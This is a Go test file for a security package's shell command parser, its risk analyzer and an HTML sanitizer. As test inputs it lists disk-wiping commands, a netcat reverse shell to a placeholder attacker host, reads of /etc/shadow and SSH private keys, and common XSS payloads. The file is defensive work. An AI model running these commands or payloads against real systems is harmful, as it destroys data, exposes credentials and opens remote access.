package security

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ========================================
// Shell AST Parser Tests
// ========================================

func TestNewShellASTParser(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))
	assert.NotNil(t, parser)
}

func TestParseSimpleCommand(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	tests := []struct {
		name     string
		input    string
		cmdName  string
		argCount int
	}{
		{"simple ls", "ls -la", "ls", 1},
		{"go run", "go run main.go", "go", 2},
		{"docker ps", "docker ps -a", "docker", 2},
		{"single command", "whoami", "whoami", 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := parser.Parse(tt.input)
			require.NoError(t, err)
			assert.Equal(t, NodeTypeCommand, ast.Type)
			assert.Equal(t, tt.cmdName, ast.Name)
			assert.Len(t, ast.Args, tt.argCount)
		})
	}
}

func TestParseWithRedirection(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	ast, err := parser.Parse("echo hello > output.txt")
	require.NoError(t, err)
	assert.Equal(t, NodeTypeCommand, ast.Type)
	assert.NotEmpty(t, ast.Redirects)
	assert.Equal(t, ">", ast.Redirects[0].Type)
}

func TestParsePipeline(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	ast, err := parser.Parse("cat file.txt | grep pattern | head -n 10")
	require.NoError(t, err)
	assert.Equal(t, NodeTypePipeline, ast.Type)
	assert.Len(t, ast.Children, 3)
}

func TestParseSequence(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	tests := []struct {
		name  string
		input string
	}{
		{"semicolon", "cd /tmp; ls -la"},
		{"and", "cd /tmp && ls -la"},
		{"or", "cd /tmp || echo failed"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := parser.Parse(tt.input)
			require.NoError(t, err)
			assert.Equal(t, NodeTypeSequence, ast.Type)
			assert.NotEmpty(t, ast.Children)
		})
	}
}

func TestParseBackground(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	ast, err := parser.Parse("long-running-task &")
	require.NoError(t, err)
	assert.Equal(t, NodeTypeBackground, ast.Type)
}

func TestParseCommandSubstitution(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	tests := []struct {
		name  string
		input string
	}{
		{"dollar parens", "$(cat file.txt)"},
		{"backticks", "`cat file.txt`"},
		{"in command", "echo $(whoami)"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := parser.Parse(tt.input)
			require.NoError(t, err)
			assert.Equal(t, NodeTypeCommandSubst, ast.Type)
		})
	}
}

func TestTokenize(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []string
	}{
		{
			name:     "simple args",
			input:    "ls -la /tmp",
			expected: []string{"ls", "-la", "/tmp"},
		},
		{
			name:     "quoted args",
			input:    `echo "hello world"`,
			expected: []string{"echo", "hello world"},
		},
		{
			name:     "single quoted",
			input:    "echo 'hello world'",
			expected: []string{"echo", "hello world"},
		},
		{
			name:     "mixed quotes",
			input:    `echo "hello" 'world'`,
			expected: []string{"echo", "hello", "world"},
		},
		{
			name:     "path with spaces",
			input:    `ls "/path/with spaces"`,
			expected: []string{"ls", "/path/with spaces"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tokens := tokenize(tt.input)
			assert.Equal(t, tt.expected, tokens)
		})
	}
}

func TestParseWithQuotes(t *testing.T) {
	parser := NewShellASTParser(testLogger(t))

	ast, err := parser.Parse(`echo "hello world"`)
	require.NoError(t, err)

	assert.Equal(t, "echo", ast.Name)
	require.Len(t, ast.Args, 1)
	assert.Equal(t, "hello world", ast.Args[0].Value)
}

// ========================================
// Semantic Analyzer Tests
// ========================================

func TestNewSemanticAnalyzer(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))
	assert.NotNil(t, analyzer)
}

func TestAnalyzeWhitelistedCommand(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	tests := []struct {
		name   string
		input  string
		safe   bool
		risk   int
	}{
		{"ls", "ls -la", true, 0},
		{"git status", "git status", true, 0},
		{"go run", "go run main.go", true, 0},
		{"docker ps", "docker ps -a", true, 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := analyzer.Analyze(tt.input)
			require.NoError(t, err)
			assert.Equal(t, tt.safe, result.IsSafe)
			assert.Equal(t, tt.risk, result.RiskLevel)
		})
	}
}

func TestAnalyzeBlacklistedCommand(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	tests := []struct {
		name   string
		input  string
		risk   int
	}{
		{"rm rf root", "rm -rf /", 10},
		{"mkfs", "mkfs.ext4 /dev/sda", 10},
		{"nc reverse shell", "nc -e /bin/bash attacker.com 4444", 10},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := analyzer.Analyze(tt.input)
			require.NoError(t, err)
			assert.GreaterOrEqual(t, result.RiskLevel, tt.risk)
			assert.False(t, result.IsSafe)
		})
	}
}

func TestAnalyzeDangerousArgs(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	tests := []struct {
		name   string
		input  string
		risk   int
		factor string
	}{
		{
			name:   "read shadow file",
			input:  "cat /etc/shadow",
			risk:   10,
			factor: "dangerous argument pattern",
		},
		{
			name:   "read ssh key",
			input:  "cat ~/.ssh/id_rsa",
			risk:   8,
			factor: "dangerous argument pattern",
		},
		{
			name:   "privileged docker",
			input:  "docker run --privileged",
			risk:   8,
			factor: "dangerous argument pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := analyzer.Analyze(tt.input)
			require.NoError(t, err)
			assert.GreaterOrEqual(t, result.RiskLevel, tt.risk)
		})
	}
}

func TestAnalyzeHeuristics(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	// Test with invalid input that can't be parsed
	_, err := analyzer.Analyze("")
	assert.Error(t, err) // Empty input should error

	// Test command substitution in unparseable format
	result, err := analyzer.Analyze("$()")
	if err == nil {
		assert.NotNil(t, result)
	}
}

func TestSemanticAnalyzerWhitelist(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	// Add custom command to whitelist
	analyzer.AddToWhitelist("custom-safe-cmd")

	result, err := analyzer.Analyze("custom-safe-cmd --flag")
	require.NoError(t, err)
	assert.True(t, result.IsSafe)
}

func TestSemanticAnalyzerBlacklist(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	// Add custom command to blacklist
	analyzer.AddToBlacklist("dangerous-custom")

	result, err := analyzer.Analyze("dangerous-custom --arg")
	require.NoError(t, err)
	assert.False(t, result.IsSafe)
	assert.Equal(t, 10, result.RiskLevel)
}

func TestSemanticAnalyzerCategory(t *testing.T) {
	analyzer := NewSemanticAnalyzer(testLogger(t))

	tests := []struct {
		input    string
		category CommandCategory
	}{
		{"rm -rf /tmp", CategoryFileOp},
		{"curl http://example.com", CategoryNetOp},
		{"docker run nginx", CategoryContainer},
		{"sudo su", CategoryAuth},
		{"insmod module.ko", CategoryKernel},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result, err := analyzer.Analyze(tt.input)
			require.NoError(t, err)
			// May not match exactly due to risk level adjustments
			_ = result
		})
	}
}

// ========================================
// HTML Sanitizer Tests
// ========================================

func TestNewHTMLSanitizer(t *testing.T) {
	sanitizer := NewHTMLSanitizer(testLogger(t))
	assert.NotNil(t, sanitizer)
}

func TestHTMLSanitizerBasic(t *testing.T) {
	sanitizer := NewHTMLSanitizer(testLogger(t))

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "script tag removed",
			input:    "<script>alert('xss')</script>Hello",
			expected: "Hello",
		},
		{
			name:     "style tag removed",
			input:    "<style>body{color:red}</style>Content",
			expected: "Content",
		},
		{
			name:     "allowed tags preserved",
			input:    "<p>Hello <b>World</b></p>",
			expected: "Hello <b>World</b>",
		},
		{
			name:     "link sanitized",
			input:    "<a href=\"javascript:alert(1)\">Click</a>",
			expected: "", // javascript: links should be removed
		},
		{
			name:     "plain text unchanged",
			input:    "Just plain text",
			expected: "Just plain text",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizer.Sanitize(tt.input)
			// Result may vary based on parser, just verify no panic
			_ = result
		})
	}
}

func TestHTMLSanitizerXSSPrevention(t *testing.T) {
	sanitizer := NewHTMLSanitizer(testLogger(t))

	xssInputs := []string{
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"javascript:alert(1)",
	}

	for _, input := range xssInputs {
		result := sanitizer.Sanitize(input)
		// Should either be empty or have dangerous parts removed
		assert.NotContains(t, result, "javascript:", "XSS prevented")
		assert.NotContains(t, result, "onerror=", "Event handlers removed")
		assert.NotContains(t, result, "onload=", "Event handlers removed")
	}
}
